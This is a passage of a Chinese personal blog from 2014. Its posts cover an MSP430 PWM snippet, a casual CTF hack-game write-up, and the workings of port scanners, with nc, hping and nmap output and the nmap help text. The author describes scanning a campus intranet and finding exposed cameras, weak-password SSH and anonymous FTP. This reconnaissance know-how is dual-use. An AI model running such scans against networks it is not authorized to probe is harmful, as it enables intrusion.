class="line">  <span class="comment">// P1.6 = TA0.1 (timer A's output). SLAS694C p.41</span></span><br><span class="line">  P1SEL |= BIT6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PWM period = 125 KHz / 625 = 200 Hz</span></span><br><span class="line">  TACCR0 = <span class="number">625</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Source Timer A from SMCLK (TASSEL_2), up mode (MC_1).</span></span><br><span class="line">  <span class="comment">// Up mode counts up to TACCR0. SLAU144E p.12-20</span></span><br><span class="line">  TACTL = TASSEL_2 | MC_1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// OUTMOD_7 = Reset/set output when the timer counts to TACCR1/TACCR0</span></span><br><span class="line">  <span class="comment">// CCIE = Interrupt when timer counts to TACCR1</span></span><br><span class="line">  TACCTL1 = OUTMOD_7 | CCIE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initial CCR1 (= brightness)</span></span><br><span class="line">  TACCR1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// LPM0 (shut down the CPU) with interrupts enabled</span></span><br><span class="line">  __bis_SR_register(CPUOFF | GIE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This will be called when timer counts to TACCR1.</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">pragma</span> vector=TIMER0_A1_VECTOR</span></span><br><span class="line">__<span class="function">interrupt <span class="keyword">void</span> <span class="title">Timer_A</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> new_ccr1 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Clear interrupt flag</span></span><br><span class="line">  TACCTL1 &amp;= ~CCIFG;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (idx &lt; <span class="number">500</span>) &#123;</span><br><span class="line">    new_ccr1 = curve[idx++ &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (idx &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    new_ccr1 = curve[(<span class="number">999</span> - idx++) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Wait to set the new TACCR1 until TAR has gone past it, so that we</span></span><br><span class="line">  <span class="comment">// don't get interrupted again in this period.</span></span><br><span class="line">  <span class="keyword">while</span> (TAR &lt;= new_ccr1);</span><br><span class="line">  TACCR1 = new_ccr1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/05/04/360-hack-game/" itemprop="url">
                  360 Hack game网络攻防
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/05/04/360-hack-game/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/05/04/360-hack-game/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>不知道把这篇文章归入哪一类，那就life吧。Hack也是life的一部分吧。</p>
<p>最开始是见有人在论坛上问第三道解码的题目。然后lz给出了个地址，就去看了看。后来还挺好玩，就继续做下去了。</p>
<p>没必要在这里披露什么答案，<a href="http://bbs.blackbap.org/thread-5800-1-1.html" target="_blank" rel="external">习科</a>和<a href="http://www.freebuf.com/articles/web/33145.html" target="_blank" rel="external">FreeBuf</a>上已经有详细解答参考答案。就随便记下个人解题过程。</p>
<p>第一关没什么压力。一看就知道显然是更改refer。</p>
<p>第二关，习惯性打开js文件，赫然写着<code>password</code>几个大字。然后就是在浏览器调试工具或者node中跑呗。出题人耍了个小技巧，让结果不返回。反正我当时竟然凭着对js的一点浅薄知识一路复制粘帖用js一层一层解了三次。最后碰到一堆<code>[+&gt;]</code>的东西。我竟然以为是brainfuck，然后把自己电脑跑死机了……后来才忽然感觉是js，复制运行得到结果。</p>
<p>第三关，一不小心在论坛上看到结果了，不过这显然对我不是什么问题。</p>
<p>第四关，发了好久呆。不了解jpg文件格式，用vim打开也没看出什么。后来发现vim打开二进制文件必须加<code>-b</code>参数。再后来在论坛上其他人的提醒下发现竟然是两幅图。光看文件大小真看不出来。</p>
<p>第五关，最简单有没有。虽然不知道都是些什么，全靠百度得来答案。。。是的，百度，谷歌都没用上。</p>
<p>第六关，试了<code>~</code>后缀，最后论坛上有人提醒是vi……真是丧心病狂……</p>
<p>第七关，还是仰仗论坛上提醒要大小写，又这么一碰竟然过了。然后128位的哈希一看就是md5,直接google得到结果。</p>
<p>第八关，代码审计给跪了，php完全不会。考虑暴力穷举感觉尝试量太大，后来见论坛上有人穷举出来了……于是也随手写了个小程序穷举起来。最后论坛上其它人用我的程序穷举出来了我还没穷举出来……</p>
<p>第九关，对着习科上答案来的……可能网络太差吧，等了好久。</p>
<p>第十关，对着参考答案来，可每次文件名都变化。看到32字节长的文件名，就想是不是报头中某个变化的东西比如时间的md5？结果愣是没看出来cookie过期了。还抓了上千个哈希试图破解，却发现只有在cmd5可以找到，还是付费内容。写了个小脚本跑字典，也没解出来文件名到底怎么来的。算了，仰仗论坛上大婶的指点，反正过了。</p>
<p>接下来我想写几样东西：</p>
<ul>
<li>关于扫描器的原理与实现</li>
<li>某次抓取DVS/DVR信息的过程</li>
<li>ftp搜索引擎</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/05/04/" itemprop="url">
                  扫描器原理与实现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/05/04/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/05/04//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便写写端口扫描器，估计不会写多。最近事情太多。</p>
<h2 id="原理">原理</h2><p>TCP端口扫描的基本原理，就是尝试与被探测端口建立连接，如果这个连接能够建立上，则说明端口是开放的。另一方面，按照TCP三次握手标准其实探测端口是否开放并不用完成三次握手建立连接，仅仅收到第二次握手的包基本就足以说明该端口确实打开并提供服务。</p>
<p>UDP是另一种无连接不可靠数据报交付协议，仅仅发送UDP报文到指定端口，然后等待返回。如果收到回复信息则说明该端口确实提供UDP服务，如果在有限时间内没收到任何回复就当作该端口不存在吧。</p>
<p>在扫描大量机器的大量端口时，比如对TCP端口扫描，如果我们发送一个包后等待建立连接，可能由于网络原因等待很久才会收到回复的报文。这样其它待扫描端口不得不等着，整个扫描器在这段时间内除了等待什么都不做。网络上行带宽没得到充分利用。所以，一般采用多线程或者异步的方式来实现扫描器的并发。</p>
<p>扫描器往往不仅仅就看看端口是否开放，它们往往还搜集信息供人判断，甚至可以提供payload来与目标进行交互。</p>
<h2 id="检阅">检阅</h2><p>最简单的扫描器，比如说netcat：</p>
<pre><code> ~ ⮀ nc -v -z bbs.byr.cn <span class="number">80</span>
Warning: inverse host lookup failed <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>: 
bbs.byr.cn [<span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>] <span class="number">80</span> (http) open
</code></pre><p>事实上你只要找个能建立连接或者构造包的东西都能作为扫描器，比如hping</p>
<pre><code> ~ ⮀ sudo hping -c <span class="number">1</span> google.com -S -V -p <span class="number">80</span> 
<span class="keyword">using</span> eth0, addr: <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>, MTU: <span class="number">1500</span>
HPING google.com (eth0 <span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span>): S <span class="built_in">set</span>, <span class="number">40</span> headers + <span class="number">0</span> data bytes
len=<span class="number">46</span> ip=<span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span> ttl=<span class="number">29</span> id=<span class="number">13203</span> tos=<span class="number">0</span> iplen=<span class="number">44</span>
sport=<span class="number">80</span> flags=SA seq=<span class="number">0</span> win=<span class="number">42900</span> rtt=<span class="number">185.2</span> ms
seq=<span class="number">2055062331</span> ack=<span class="number">2123742633</span> sum=<span class="number">2338</span> urp=<span class="number">0</span>


--- google.com hping statistic ---
<span class="number">1</span> packets tramitted, <span class="number">1</span> packets received, <span class="number">0</span>% packet loss
</code></pre><p>更专业一点的扫描器有nmap，非常专业的扫描器，在nmap script engine的扩展(lua)下更是可以方便的实现各种功能。功能强大、使用简洁暴力。</p>
<pre><code>✘ ⮀ ~ ⮀ sudo nmap -sS baidu<span class="class">.com</span>

Starting Nmap <span class="number">6.25</span> ( http:<span class="comment">//nmap.org ) at 2014-05-10 10:10 CST</span>
Nmap scan report <span class="keyword">for</span> baidu<span class="class">.com</span> (<span class="number">220.181</span>.<span class="number">111.86</span>)
Host is up (<span class="number">0.0019s</span> latency).
Other addresses <span class="keyword">for</span> baidu<span class="class">.com</span> (not scanned): <span class="number">123.125</span>.<span class="number">114.144</span> <span class="number">220.181</span>.<span class="number">111.85</span>
Not shown: <span class="number">999</span> filtered ports
PORT   STATE SERVICE
<span class="number">80</span>/tcp open  http

Nmap done: <span class="number">1</span> IP <span class="tag">address</span> (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">37.67</span> seconds
</code></pre><p>近两年出现了更加高效的面向整个互联网的扫描器。一个叫zmap，紧接着是masscan。和nmap的多线程实现不同，这两种扫描器靠异步实现高并发。</p>
<h2 id="实践">实践</h2><p>我本来想详细写写最近研究扫描器的一些心得，可是，最近事情太多，没有心情也没有时间。大致用python写扫描器的一些心得吧。</p>
<ol>
<li>你不一定要用别人现成的库。因为你可能根本搞不清有些东西是怎么运作的，而一些细节会让你痛不欲生。事实上如果你只想抓取部分信息，不妨直接自己解析报文对应字段。有时你不得不自己去做什么，比如面对某些用ActiveX的奇葩系统而你还想用python来扫描并搜集信息时。</li>
<li>gevent面对网络I/O真是毫无压力，但同时给内存和CPU带来了更大的负担。据说一个Greenlet占用四个文件描述符，gevent要拷贝大量上下文等等。实际上我这里有时并发根本上不去。超过2000就看着CPU一直处于100%左右而网络流量没有任何变化。不知道是哪里的限制，网络上行无法到达顶峰。但一些简单的例子可以无压力达到。</li>
<li>在进行大范围扫描时不要将某个可能会变的巨大变量塞进内存，虽然把对象放入内存也许会运行的更快，但你的内存满掉时它就不会更快了。这时通过shelve来实现字典相比直接把巨大的dict读入内存并不断扩展更合适。在我的某个例子中，把变量放到硬盘上而不是一股脑塞进内存后性能得到极大改善。</li>
<li><p>大文件的读写时，python有个优雅的方式。一行一行读取。无论是什么巨大的东西，比如说15G的字典文件，这样一行一行读入内存然后让python的垃圾回收机制慢慢回收基本不会占用什么内存。</p>
<pre><code>with <span class="function"><span class="title">open</span><span class="params">(<span class="string">"./data/netbios/temp"</span>)</span></span> as f:
    <span class="keyword">for</span> line <span class="keyword">in</span> f:
        pool.<span class="function"><span class="title">spawn</span><span class="params">(get_netbios, line.strip()</span></span>)
</code></pre></li>
</ol>
<p>还有些其它想法。</p>
<ol>
<li><p>一个是twisted，虽然之前把一个非常棒的教程完整实践下来，寒假拿着手机把文档直接都看完了，甚至Gsoc的时候还想着如果twisted是mentor organization争取报名参加下。结果几个月没接触，完全不知道怎么使用这个框架了。</p>
</li>
<li><p>一个是python对select和epoll的支持，我觉得可能直接使用epoll实现一些并发比gevent会好很多。可是没空去试，我一直觉得epoll和select这种东西用python写出来真是不堪入目。如果是py3，async也许是个好主意。</p>
</li>
<li><p>在使用python做一些比如ip地址处理等等的时候，你也许会发现python3有着内置的模块，更优雅的处理方式。有那么几次真想完全用python3改写已经使用的东西。不过，还是没空。</p>
</li>
</ol>
<p>还有，同学给了我片单片机，我忽然觉得扫描器玩腻了……</p>
<p>不过面对积累的大量扫描数据，我觉得做做数据分析和可视化还是不错的。不会遥遥无期吧，尽管只对python的工具稍微熟悉，更想去用d3.js做展示。</p>
<p>时间和精力有限，语言技能点该怎么点呢？</p>
<p>汇编、C、javascript、python3、lua、也许go、也许再个ruby.</p>
<p>还有两本书等着看或正在看，TCP/IP internetworking和深入理解计算机系统.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/04/18/" itemprop="url">
                  且谈扫描器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-04-18T00:00:00+08:00" content="2014-04-18">
              2014-04-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/04/18/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/04/18//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="缘起">缘起</h2><p>大概是因为论坛一个毕业去阿里的师兄就这么扫到了一个某品牌摄像头web管理界面。接着，对于我，YD的几周便开始了。各种扫描内网啊，No zuo no die啊= =，然后找到了一大堆开放到内网的摄像头、弱口令ssh、匿名ftp、嵌入式板甚至还有ip电话……独留我风中凌乱。</p>
<p>我准备把常见的东西都研究一圈= =</p>
<p>总之，用到了几种扫描器和自己写的扫描器……</p>
<h2 id="nmap">nmap</h2><p>nmap是一个专业的网络探索和安全审计开源工具。尽管它可以针对主机，却被设计来快速扫描大规模网络。nmap使用IP报文来决定网络上的主机是否可达，主机上哪些服务开放(应用程序名和版本)，它们运行着什么样的操作系统，包过滤器和防火墙的情况和许多其它特征。尽管nmap广泛用于安全审计。许多系统和网络管理员在实行日常工作比如网络发现、管理服务升级安排，监控主机或服务启动时间<br>时都很好用。</p>
<p>nmap的输出是一列被扫描的目标，和有关参数指定的补充信息。常见的比如说端口信息表：</p>
<p> ~ ⮀ sudo nmap 10.210.96.193</p>
<pre><code>Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 21:44 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.054</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE
<span class="number">21</span>/tcp    ssh      closed
<span class="number">23</span>/tcp    open     telnet
<span class="number">50389</span>/tcp filtered unknown
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><ul>
<li><code>open</code>意味着服务在启动并监听着。比如TCP的三次握手成功建立。</li>
<li><code>closed</code>表示该端口上服务关闭。比如收到了目标主机返回的RST.</li>
<li><code>filtered</code>意味着有防火墙，过滤器等其它障碍阻塞了端口，以致于nmap不知道端口是<code>open</code>还是<code>closed</code>。出现这种情况是发出去的探测包没了响应。</li>
</ul>
<p>如果nmap不能确定到底是哪个状态，这些状态可以写成折中形式<code>closed|filtered</code>,表示关闭或者是过滤。</p>
<p>当使用版本探测参数(<code>-sV</code>)时，端口信息表也可以包含具体的服务版本信息。</p>
<pre><code> ~ ⮀ sudo nmap -sV <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:03 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.045</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE VERSION
<span class="number">23</span>/tcp    open     telnet  H3C <span class="keyword">switch</span> telnetd
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
Service <span class="string">Info:</span> <span class="string">Device:</span> <span class="keyword">switch</span>

Service detection performed. Please report any incorrect results at <span class="string">http:</span><span class="comment">//nmap.org/submit/ .</span>
Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.88</span> seconds
</code></pre><p>当使用IP协议扫描(<code>-sO</code>)时，nmap则提供IP支持的协议而不是端口：</p>
<pre><code> ~ ⮀ sudo nmap -sO <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:02 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.010</span>s latency).
Not <span class="string">shown:</span> <span class="number">252</span> open|filtered protocols
PROTOCOL STATE  SERVICE
<span class="number">1</span>        open   icmp
<span class="number">6</span>        open   tcp
<span class="number">17</span>       open   udp
<span class="number">132</span>      closed sctp
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><p>除了端口信息表，nmap提供目标的更多信息，包括反向DNS域名，操作系统猜测，设备类型和MAC地址。</p>
<p>更多参照<a href="http://nmap.org/book/" target="_blank" rel="external">Nmap Guide</a></p>
<pre><code><span class="bullet"> ~ </span>⮀ nmap --help
Nmap 6.25 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -<span class="ruby">iL &lt;inputfilename&gt;<span class="symbol">:</span> <span class="constant">Input</span> from list of hosts/networks
</span>  -<span class="ruby">iR &lt;num hosts&gt;<span class="symbol">:</span> <span class="constant">Choose</span> random targets
</span>  -<span class="ruby">-exclude &lt;host1[,host2][,host3],...&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> hosts/networks
</span>  -<span class="ruby">-excludefile &lt;exclude_file&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> list from file
</span>HOST DISCOVERY:
  -<span class="ruby"><span class="symbol">sL:</span> <span class="constant">List</span> <span class="constant">Scan</span> - simply list targets to scan
</span>  -<span class="ruby"><span class="symbol">sn:</span> <span class="constant">Ping</span> <span class="constant">Scan</span> - disable port scan
</span>  -<span class="ruby"><span class="constant">Pn</span><span class="symbol">:</span> <span class="constant">Treat</span> all hosts as online -- skip host discovery
</span>  -<span class="ruby"><span class="constant">PS</span>/<span class="constant">PA</span>/<span class="constant">PU</span>/<span class="constant">PY</span>[portlist]<span class="symbol">:</span> <span class="constant">TCP</span> <span class="constant">SYN</span>/<span class="constant">ACK</span>, <span class="constant">UDP</span> <span class="keyword">or</span> <span class="constant">SCTP</span> discovery to given ports
</span>  -<span class="ruby"><span class="constant">PE</span>/<span class="constant">PP</span>/<span class="constant">PM</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo, timestamp, <span class="keyword">and</span> netmask request discovery probes
</span>  -<span class="ruby"><span class="constant">PO</span>[protocol list]<span class="symbol">:</span> <span class="constant">IP</span> <span class="constant">Protocol</span> <span class="constant">Ping</span>
</span>  -<span class="ruby">n/-<span class="constant">R</span><span class="symbol">:</span> <span class="constant">Never</span> <span class="keyword">do</span> <span class="constant">DNS</span> resolution/<span class="constant">Always</span> resolve [<span class="symbol">default:</span> sometimes]
</span>  -<span class="ruby">-dns-servers &lt;serv1[,serv2],...&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">DNS</span> servers
</span>  -<span class="ruby">-system-<span class="symbol">dns:</span> <span class="constant">Use</span> <span class="constant">OS</span><span class="string">'s DNS resolver
</span></span>  -<span class="ruby"><span class="string">-traceroute: Trace hop path to each host
</span></span>SCAN TECHNIQUES:
  -<span class="ruby"><span class="string">sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span></span>  -<span class="ruby"><span class="string">sU: UDP Scan
</span></span>  -<span class="ruby"><span class="string">sN/sF/sX: TCP Null, FIN, and Xmas scans
</span></span>  -<span class="ruby"><span class="string">-scanflags &lt;flags&gt;: Customize TCP scan flags
</span></span>  -<span class="ruby"><span class="string">sI &lt;zombie host[:probeport]&gt;: Idle scan
</span></span>  -<span class="ruby"><span class="string">sY/sZ: SCTP INIT/COOKIE-ECHO scans
</span></span>  -<span class="ruby"><span class="string">sO: IP protocol scan
</span></span>  -<span class="ruby"><span class="string">b &lt;FTP relay host&gt;: FTP bounce scan
</span></span>PORT SPECIFICATION AND SCAN ORDER:
  -<span class="ruby"><span class="string">p &lt;port ranges&gt;: Only scan specified ports
</span></span>    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -<span class="ruby"><span class="string">F: Fast mode - Scan fewer ports than the default scan
</span></span>  -<span class="ruby"><span class="string">r: Scan ports consecutively - don'</span>t randomize
</span>  -<span class="ruby">-top-ports &lt;number&gt;<span class="symbol">:</span> <span class="constant">Scan</span> &lt;number&gt; most common ports
</span>  -<span class="ruby">-port-ratio &lt;ratio&gt;<span class="symbol">:</span> <span class="constant">Scan</span> ports more common than &lt;ratio&gt;
</span>SERVICE/VERSION DETECTION:
  -<span class="ruby"><span class="symbol">sV:</span> <span class="constant">Probe</span> open ports to determine service/version info
</span>  -<span class="ruby">-version-intensity &lt;level&gt;<span class="symbol">:</span> <span class="constant">Set</span> from <span class="number">0</span> (light) to <span class="number">9</span> (try all probes)
</span>  -<span class="ruby">-version-<span class="symbol">light:</span> <span class="constant">Limit</span> to most likely probes (intensity <span class="number">2</span>)
</span>  -<span class="ruby">-version-<span class="symbol">all:</span> <span class="constant">Try</span> every single probe (intensity <span class="number">9</span>)
</span>  -<span class="ruby">-version-<span class="symbol">trace:</span> <span class="constant">Show</span> detailed version scan activity (<span class="keyword">for</span> debugging)
</span>SCRIPT SCAN:
  -<span class="ruby"><span class="symbol">sC:</span> equivalent to --script=default
</span>  -<span class="ruby">-script=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> &lt;<span class="constant">Lua</span> scripts&gt; is a comma separated list of 
</span>           directories, script-files or script-categories
  -<span class="ruby">-script-args=&lt;n1=v1,[n2=v2,...]&gt;<span class="symbol">:</span> provide arguments to scripts
</span>  -<span class="ruby">-script-args-file=<span class="symbol">filename:</span> provide <span class="constant">NSE</span> script args <span class="keyword">in</span> a file
</span>  -<span class="ruby">-script-<span class="symbol">trace:</span> <span class="constant">Show</span> all data sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-script-<span class="symbol">updatedb:</span> <span class="constant">Update</span> the script database.
</span>  -<span class="ruby">-script-help=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> <span class="constant">Show</span> help about scripts.
</span>           &lt;Lua scripts&gt; is a comma separted list of script-files or
           script-categories.
OS DETECTION:
  -<span class="ruby"><span class="constant">O</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection
</span>  -<span class="ruby">-osscan-<span class="symbol">limit:</span> <span class="constant">Limit</span> <span class="constant">OS</span> detection to promising targets
</span>  -<span class="ruby">-osscan-<span class="symbol">guess:</span> <span class="constant">Guess</span> <span class="constant">OS</span> more aggressively
</span>TIMING AND PERFORMANCE:
  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -<span class="ruby"><span class="constant">T</span>&lt;<span class="number">0</span>-<span class="number">5</span>&gt;<span class="symbol">:</span> <span class="constant">Set</span> timing template (higher is faster)
</span>  -<span class="ruby">-min-hostgroup/max-hostgroup &lt;size&gt;<span class="symbol">:</span> <span class="constant">Parallel</span> host scan group sizes
</span>  -<span class="ruby">-min-parallelism/max-parallelism &lt;numprobes&gt;<span class="symbol">:</span> <span class="constant">Probe</span> parallelization
</span>  -<span class="ruby">-min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Specifies</span>
</span>      probe round trip time.
  -<span class="ruby">-max-retries &lt;tries&gt;<span class="symbol">:</span> <span class="constant">Caps</span> number of port scan probe retransmissions.
</span>  -<span class="ruby">-host-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Give</span> up on target after this long
</span>  -<span class="ruby">-scan-delay/--max-scan-delay &lt;time&gt;<span class="symbol">:</span> <span class="constant">Adjust</span> delay between probes
</span>  -<span class="ruby">-min-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no slower than &lt;number&gt; per second
</span>  -<span class="ruby">-max-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no faster than &lt;number&gt; per second
</span>FIREWALL/IDS EVASION AND SPOOFING:
  -<span class="ruby">f; --mtu &lt;val&gt;<span class="symbol">:</span> fragment packets (optionally w/given <span class="constant">MTU</span>)
</span>  -<span class="ruby"><span class="constant">D</span> &lt;decoy1,decoy2[,<span class="constant">ME</span>],...&gt;<span class="symbol">:</span> <span class="constant">Cloak</span> a scan with decoys
</span>  -<span class="ruby"><span class="constant">S</span> &lt;<span class="constant">IP_Address</span>&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> source address
</span>  -<span class="ruby">e &lt;iface&gt;<span class="symbol">:</span> <span class="constant">Use</span> specified interface
</span>  -<span class="ruby">g/--source-port &lt;portnum&gt;<span class="symbol">:</span> <span class="constant">Use</span> given port number
</span>  -<span class="ruby">-data-length &lt;num&gt;<span class="symbol">:</span> <span class="constant">Append</span> random data to sent packets
</span>  -<span class="ruby">-ip-options &lt;options&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets with specified ip options
</span>  -<span class="ruby">-ttl &lt;val&gt;<span class="symbol">:</span> <span class="constant">Set</span> <span class="constant">IP</span> time-to-live field
</span>  -<span class="ruby">-spoof-mac &lt;mac address/prefix/vendor name&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> your <span class="constant">MAC</span> address
</span>  -<span class="ruby">-<span class="symbol">badsum:</span> <span class="constant">Send</span> packets with a bogus <span class="constant">TCP</span>/<span class="constant">UDP</span>/<span class="constant">SCTP</span> checksum
</span>OUTPUT:
  -<span class="ruby">oN/-oX/-oS/-oG &lt;file&gt;<span class="symbol">:</span> <span class="constant">Output</span> scan <span class="keyword">in</span> normal, <span class="constant">XML</span>, s|&lt;rIpt kIddi3,
</span>     and Grepable format, respectively, to the given filename.
  -<span class="ruby">oA &lt;basename&gt;<span class="symbol">:</span> <span class="constant">Output</span> <span class="keyword">in</span> the three major formats at once
</span>  -<span class="ruby"><span class="symbol">v:</span> <span class="constant">Increase</span> verbosity level (use -vv <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby"><span class="symbol">d:</span> <span class="constant">Increase</span> debugging level (use -dd <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby">-<span class="symbol">reason:</span> <span class="constant">Display</span> the reason a port is <span class="keyword">in</span> a particular state
</span>  -<span class="ruby">-<span class="symbol">open:</span> <span class="constant">Only</span> show open (<span class="keyword">or</span> possibly open) ports
</span>  -<span class="ruby">-packet-<span class="symbol">trace:</span> <span class="constant">Show</span> all packets sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-<span class="symbol">iflist:</span> <span class="constant">Print</span> host interfaces <span class="keyword">and</span> routes (<span class="keyword">for</span> debugging)
